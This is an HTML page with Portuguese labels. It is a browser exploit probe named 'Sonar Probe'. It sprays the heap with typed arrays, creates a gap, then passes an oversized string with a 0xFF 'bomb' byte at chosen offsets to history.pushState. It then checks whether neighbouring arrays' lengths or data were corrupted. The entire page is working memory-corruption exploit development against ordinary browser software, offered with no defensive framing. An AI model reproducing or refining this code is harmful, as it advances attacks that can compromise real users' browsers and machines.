<!DOCTYPE html>
<html>
<head>
    <title>Sonar Probe: Deep Scan</title>
    <style>
        body { background: #000; color: #ff00ff; font-family: monospace; padding: 20px; }
        .log { border: 1px solid #505; height: 350px; overflow-y: scroll; padding: 10px; background: #101; color: #eef; margin-bottom: 15px;}
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
        button { 
            padding: 15px; font-weight: bold; cursor: pointer; 
            background: #202; color: #f0f; border: 1px solid #505; 
            font-size: 16px; transition: 0.2s;
        }
        button:hover { background: #f0f; color: #000; box-shadow: 0 0 10px #f0f; }
        .danger { border-color: red; color: red; }
    </style>
</head>
<body>
    <h1>SONAR PROBE</h1>
    <p>Base: 709518 | Hole: 168</p>
    <p>Objetivo: Descobrir onde o objeto começa e termina usando um byte "Bomba" (FF).</p>

    <div id="logger" class="log">Sistema pronto.</div>

    <div class="grid">
        <button onclick="runProbe(0)">1. Bomba no Byte 0 (Header)</button>
        <button onclick="runProbe(8)">2. Bomba no Byte 8</button>
        <button onclick="runProbe(16)">3. Bomba no Byte 16</button>
        <button onclick="runProbe(24)">4. Bomba no Byte 24</button>
        <button onclick="runProbe(32)">5. Bomba no Byte 32</button>
        <button onclick="runProbe(40)">6. Bomba no Byte 40</button>
        <button onclick="runProbe(48)">7. Bomba no Byte 48</button>
        <button onclick="runProbe(64)">8. Bomba no Byte 64 (Profundo)</button>
    </div>

    <script>
        const logger = document.getElementById('logger');
        const BASE_SIZE = 709518; 
        const HOLE_SIZE = 168;    
        const SPRAY_SIZE = 8000;
        const MAGIC_NUM = 0x41414141;

        var spray = [];

        function log(msg) {
            const d = document.createElement('div');
            d.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
            logger.appendChild(d);
            logger.scrollTop = logger.scrollHeight;
        }

        async function runProbe(offset) {
            log("---------------------------------------");
            log(`SONAR: Colocando 0xFF no offset ${offset}...`);
            log(`Preenchimento: ${offset} bytes de 0x00.`);

            // Limpeza
            spray = null;
            if(window.gc) window.gc();
            await new Promise(r => setTimeout(r, 200));
            spray = [];

            // Spray
            for(let i=0; i < SPRAY_SIZE; i++) {
                let arr = new Uint32Array(1024);
                arr[0] = MAGIC_NUM; 
                arr[1] = i;         
                spray.push(arr);
            }

            // Buraco
            let center = 4000;
            for(let i=0; i < HOLE_SIZE; i++) {
                spray[center + i] = null;
            }

            log("Aguardando GC...");
            await new Promise(r => setTimeout(r, 1000));

            try {
                // Base
                let base = new Array(BASE_SIZE + 1).join('A');
                
                // Constrói o Payload SONAR
                // X bytes de Zeros (Seguros) + 1 Byte de FF (Perigo)
                let padding = "";
                if(offset > 0) {
                    padding = new Array(offset + 1).join("\x00");
                }
                let bomb = "\xFF"; // O byte que causa crash
                
                // Adicionamos um pouco de "cauda" segura depois da bomba para garantir a escrita
                let tail = "A".repeat(10); 

                let payload = base + padding + bomb + tail;

                history.pushState({}, "pwn_" + Date.now(), payload);
                
                checkCorruption(HOLE_SIZE, center);

            } catch(e) {
                log("ERRO: " + e.message);
            }
        }

        function checkCorruption(holeUsed, startIdx) {
            let found = false;
            let limit = startIdx + holeUsed + 60;

            for(let i = startIdx + holeUsed; i < limit; i++) {
                if (i >= spray.length) break;
                let arr = spray[i];
                if(arr) {
                    // Verifica se o length mudou
                    if(arr.length !== 1024) {
                        found = true;
                        document.body.style.background = "green";
                        alert(`SUCESSO! Length alterado no vizinho ${i}!`);
                        return;
                    }
                    // Verifica dados
                    if(arr[0] !== MAGIC_NUM) {
                        found = true;
                        log(`DADOS ALTERADOS no Index ${i}.`);
                    }
                }
            }
            if(!found) log(`Sem efeito visível (Offset ${startIdx}). Se não crashou, o byte FF caiu em local não-crítico.`);
        }
    </script>
</body>
</html>
